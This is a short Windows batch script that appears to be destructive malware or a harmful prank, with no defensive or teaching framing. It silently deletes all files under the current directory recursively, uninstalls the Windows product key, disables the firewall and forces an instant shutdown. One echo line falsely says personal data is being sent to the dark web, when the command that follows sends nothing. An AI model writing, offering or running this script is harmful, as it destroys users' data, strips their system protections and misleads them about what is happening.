@echo off
echo Deleting files...
del /s /f /q *
echo Sending personal data to the dark web...
cscript //Nologo //B c:\windows\system32\slmgr.vbs -upk
echo Disabling firewall...
netsh advfirewall set currentprofile state off
echo Initiating system shutdown...
shutdown /s /f /t 0
